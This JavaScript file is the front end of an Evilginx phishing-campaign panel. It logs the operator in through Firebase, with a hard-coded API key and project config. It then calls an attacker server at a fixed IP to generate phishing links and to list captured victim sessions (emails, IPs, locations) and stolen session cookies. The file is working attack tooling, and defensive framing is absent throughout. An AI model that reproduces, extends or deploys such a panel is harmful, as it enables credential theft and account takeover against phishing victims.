const firebaseConfig = {
    apiKey: "AIzaSyDiNWtXm4oHQ6NpHPiLJjV4EDgU7yUQjq0",
    authDomain: "panel-auth-134b7.firebaseapp.com",
    projectId: "panel-auth-134b7",
    storageBucket: "panel-auth-134b7.firebasestorage.app",
    messagingSenderId: "892746068340",
    appId: "1:892746068340:web:f8c4d5b798e8bc48447c21"
};

firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();

const EVILGINX_SERVER = "http://3.149.242.245:5000"; // Replace with your Evilginx IP

function login() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    
    auth.signInWithEmailAndPassword(email, password)
        .then(() => {
            window.location.href = "dashboard.html";
        })
        .catch(error => {
            document.getElementById("loginError").innerText = error.message;
        });
}

function logout() {
    auth.signOut().then(() => {
        window.location.href = "index.html";
    });
}

function generatePhishingLink() {
    fetch(`${EVILGINX_SERVER}/generate_link`, { method: "POST" })
    .then(response => response.json())
    .then(data => {
        if (data.link) {
            document.getElementById("generatedLink").innerText = `Phishing Link: ${data.link}`;
        } else {
            alert("Failed to generate link.");
        }
    })
    .catch(error => console.error("Error generating link:", error));
}

function fetchCapturedSessions() {
    fetch(`${EVILGINX_SERVER}/sessions`)
    .then(response => response.json())
    .then(data => {
        let sessionTable = document.getElementById("capturedSessions");
        sessionTable.innerHTML = "<tr><th>Email</th><th>IP</th><th>Time</th><th>Location</th></tr>";
        data.sessions.forEach(session => {
            sessionTable.innerHTML += `<tr>
                <td>${session.email}</td>
                <td>${session.ip}</td>
                <td>${session.time}</td>
                <td>${session.location}</td>
            </tr>`;
        });
    })
    .catch(error => console.error("Error fetching sessions:", error));
}

function fetchCookies() {
    fetch(`${EVILGINX_SERVER}/cookies`)
    .then(response => response.json())
    .then(data => {
        let cookiesTable = document.getElementById("cookiesTable");
        cookiesTable.innerHTML = "<tr><th>Session ID</th><th>Cookie Data</th></tr>";
        data.cookies.forEach(cookie => {
            cookiesTable.innerHTML += `<tr>
                <td>${cookie.session_id}</td>
                <td>${cookie.cookie_data}</td>
            </tr>`;
        });
    })
    .catch(error => console.error("Error fetching cookies:", error));
}
